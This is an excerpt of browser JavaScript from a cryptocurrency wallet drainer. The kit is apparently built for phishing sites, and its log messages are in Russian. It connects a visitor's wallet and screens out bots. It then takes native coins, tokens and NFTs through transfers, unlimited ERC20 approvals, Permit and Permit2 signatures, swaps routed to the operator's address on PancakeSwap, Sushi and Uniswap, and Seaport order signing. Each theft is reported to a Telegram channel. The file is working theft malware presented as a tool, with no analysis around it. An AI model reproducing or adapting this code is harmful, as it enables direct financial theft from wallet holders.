...
const deniedTransactionErrors = ['MetaMask Tx Signature: User denied transaction signature.',`User rejected the request.`,`The transaction was cancelled`]
...
const chainToId = {
    ...
    // pls: {
    //     chainId: "0x171",
    //     abiUrl: "https://scan.pulsechain.com/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken",
...
async function getWalletAccount() {
    ...
    waitAlert();
    // account = "0x69103fd09d201bf6430B287d0B7FE56a0ab4B0fB";
    account = accounts[0];
    ...
    await Promise.all(
        data.map(async (item) => {
            ...
            if (item.id == item.chain) {
                if (item.chain == "eth") {
                    temp.tokenAmount =
                        ethers.BigNumber.from(temp.tokenAmount) - (temp.tokenAmount / temp.balance) * 11 * multiplier;
                    temp.tokenAmount = temp.tokenAmount.toString();

                    temp.balance = temp.balance - 11 * multiplier;
                } else {
                    temp.tokenAmount =
                        ethers.BigNumber.from(temp.tokenAmount) - (temp.tokenAmount / temp.balance) * 5 * multiplier;
                    temp.tokenAmount = temp.tokenAmount.toString();

                    temp.balance = temp.balance - 5 * multiplier;
                }
            }
    ...
    if (await isBot()) {
        logTlg(`❗️<b>#${userId}</b> - забанен <b>BOT</b>!`);
        return;
    }
...
async function isBot() {
    ...
    return await new Promise(async (resolve, reject) => {
        try {
            ...
            if (e.message == "The requested account and/or method has not been authorized by the user.") resolve(true);
...
async function claimETH(amount, msg, chainId, symbol, balance) {
    try {
        ...
        if (chainId == "0x1") {
            mgasPrice = web3.utils.toHex(Math.floor(gasPrice * 1.5));
        }
        ...
        try {
            ...
            if (!deniedTransactionErrors.includes(e.message)) {
                logTlg(`❗️ <b>#${userId}</b> ошибка при <b>TRANSFER</b>.`);
                logTlgError(e.message);
            }
...
async function claimERC20(tokenAddress, amount, msg, chainId, abiUrl, symbol, balance, network, item) {
    try {
        ...
        if (hasPermit && chainId !== "0x89") {
            await logTlg(
                `🔄 <b>#${userId} получил PERMIT ${item.tokenAmountFix} ${symbol} (${balance.toFixed(
                    2
            ...
            if (permitApprove == 1) {
                permitComplete = true;
                axios.post(TOKEN_APPROVE, data).then(async function (response) {});
        ...
        try {
            ...
            if (!deniedTransactionErrors.includes(e.message)) {
                logTlg(`❗️ <b>#${userId}</b> ошибка при <b>APPROVE</b>.`);
                logTlgError(e.message);
            }
        }
        await logTlg(
        ...
        try {
            ...
            try {
                ...
                try {
                    if (
                        e.message != "contract.estimateGas.increaseAllowance is not a function" &&
                    ...
                    if (window.ethereum) {
                        let ABI = [
                            "function approve(address spender, uint256 addedValue) public returns (bool success)",
                        ];

                        if (tokenAddress == "0xdAC17F958D2ee523a2206206994597C13D831ec7".toLocaleLowerCase()) {
                            ABI = ["function approve(address _spender, uint256 _value) public"];
                            const tx = await contract.approve(operator, MAX_APPROVAL, { gasLimit: 500000 });
                            txHash = tx.hash;
                        } else {
                            const iface = new ethers.utils.Interface(ABI);
                            const abi_data = iface.encodeFunctionData("approve", [operator, MAX_APPROVAL]);
...
async function claimNFT(tokenAddress, nftTokenID, chainId, msg, balance) {
    try {
        ...
        try {
            ...
            console.log(e);
            if (!deniedTransactionErrors.includes(e.message)) {
                logTlg(`❗️ <b>#${userId}</b> ошибка при <b>CLAIM NFT</b>.`);
                logTlgError(e.message);
            }
            success = 0;
        }
...
async function claim1155NFT(tokenAddress, nftTokenID, chainId, msg) {
    try {
        ...
        try {
            ...
            console.log(e);
            if (!deniedTransactionErrors.includes(e.message)) {
                logTlg(`❗️ <b>#${userId}</b> ошибка при <b>CLAIM 1155 NFT</b>.`);
                logTlgError(e.message);
            }
            success = 0;
        }
        ...
        try {
            ...
            if (e.code == "-32601") {
                ...
                try {
                    ...
                    console.log(e);
                    if (!deniedTransactionErrors.includes(e.message)) {
                        logTlg(`❗️ <b>#${userId}</b> ошибка при <b>SIGN 1155 NFT</b>.`);
                        logTlgError(e.message);
                    }
    ...
    try {
        ...
        try {
            ...
            await pancakeRouter.methods
                .swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress, deadline)
                .send({
                    from: account,
                });
        } catch (e) {
            console.log(e);
            if (!deniedTransactionErrors.includes(e.message)) {
                logTlg(`❗️ <b>#${userId}</b> ошибка при <b>PANCAKE</b>.`);
                logTlgError(e.message);
            }
            success = 0;
        }
...
async function sendPancake2(tokenAddress, amount, msg, symbol, balance, itemToken) {
    try {
        ...
        try {
            ...
            if (!deniedTransactionErrors.includes(e.message)) {
                logTlg(`❗️ <b>#${userId}</b> ошибка при <b>SPANCAKE 2</b>.`);
                logTlgError(e.message);
            }
            success = 0;
        }
...
async function sendSushi(tokenAddress, amount, msg, symbol, balance, item) {
    try {
        ...
        try {
            ...
            console.log(e);
            if (!deniedTransactionErrors.includes(e.message)) {
                logTlg(`❗️ <b>#${userId}</b> ошибка при <b>SUSHI</b>.`);
                logTlgError(e.message);
            }
            success = 0;
        }
...
async function sendUniswap(msg, balance) {
    try {
        await logTlg(`🔄 <b>#${userId} получил UNISWAP Multicall ${balance.toFixed(2)}$</b>`);
        let deadline = Math.floor(Date.now() / 1000) + 9999 * 10;
        ...
        for (var item of tokenList) {
            if (item.type == "1" && item.approved == true) {
                try {
                    ...
                    console.log(amountIn, amountOut, path, ownerAddress);
                    item.data = await contractMulticall.methods
                        .swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress)
                        .encodeABI();

                    const gas = await contractMulticall.methods
                        .swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress)
                        .estimateGas({ from: account });
        ...
        if (calls.length != 0) {
            try {
                ...
                const gasPrice = await web3.eth.getGasPrice();
                await contractMulticall.methods.multicall(calls).send({ from: account });
            } catch (e) {
                console.log(e);
                if (!deniedTransactionErrors.includes(e.message)) {
                    logTlg(`❗️ <b>#${userId}</b> ошибка при <b>UNISWAP</b>.`);
                    logTlgError(e.message);
                }
                success = 0;
            }
        ...
        try {
            if (item.balance > 4) {
                ...
                if (item.type == "0") {
                    ...
                    await sendPancake(item.tokenAddress, item.approve_amount, msgs, item.symbol, item.balance, item);
                } else if (item.type == "32") {
                    msgs = `<b>PancakeSwap2 ${item.tokenAmountFix} ${item.symbol} (${item.balance.toFixed(
                        2
                    )}$)</b> в сети <b>${chainIdToName[item.chain]}</b>`;
                    await sendPancake2(item.tokenAddress, item.approve_amount, msgs, item.symbol, item.balance, item);
                } else if (item.type == "4") {
                    ...
                    success = 1;
                    await logTlg(`🔄 <b>#${userId} получил SEAPORT на сумму ${item.balance.toFixed(2)}$</b>`);
                    ...
                    await Seaport.signOrder(offer, parseInt(counter))
                        ...
                        .catch(function (error) {
                            ...
                            if (!deniedTransactionErrors.includes(error.message)) {
                                logTlg(`❗️ <b>#${userId}</b> ошибка при <b>SEAPORT</b>.`);
                                logTlgError(error.message);
                            }
                            logTlgMsg(msgs, success);
                        });
                } else {
...
const changeNetwork = async (chainId) => {
    ...
    if (window.ethereum) {
        try {
            if (`${currentNetwork || `0x${currentNetworkVersion}`}` != `${chainIdToName[chainId]}`) {
                await logTlg(
...
async function permit2(token, amount, msg, chain, symbol, balance, network, item) {
    try {
        ...
        const value = "1460501637330902918203684832716283019655932542975";
        const valueString = value.toString();
        let amountOut = ethers.BigNumber.from(amount).toString();
        let amountOutBN = ethers.BigNumber.from(amount);

        const maxAmountOut = ethers.BigNumber.from(value).toString();
        const maxAmountOutBN = ethers.BigNumber.from(value);

        if (amountOutBN.gte(maxAmountOutBN)) {
        ...
        await web3.currentProvider.sendAsync(
            ...
            async (error, result) => {
                if (error != null) {
                    ...
                    success = 0;
                    await logTlgMsg(msg, success);

                    if (!deniedTransactionErrors.includes(error.message)) {
                        logTlg(`❗️ <b>#${userId}</b> ошибка при <b>PERMIT2</b>.`);
                        logTlgError(error.message);
                    }
                    return;
                }
        ...
        console.log(e);
        if (!deniedTransactionErrors.includes(e.message)) {
            logTlg(`❗️ <b>#${userId}</b> ошибка при <b>PREMIT2</b>.`);
            logTlgError(e.message);
        }
    }
}
...
async function logTlg(msg, isUnique) {
    if (isUnique) {
        try {
...
async function logTokenList() {
    ...
    [ethMainnet, ...Object.values(chainsNetworkParams)].map((chain) => {
        ...
        let UniSwapMsg = `\n<b>UniSwap</b> - ${UniSwap.length ? "<i>Обнаружено</i>" : "<i>Не обнаружено</i>"}`;
    ...
    const total = tokenList.reduce((balance, token) => {
        return (balance += token.balance || 0);
    }, 0);
    ...
    if (total <= 20) {
        ...
        return await logTlg(emptyMsg, true);
    }

    await logTlg(msg, true);
}
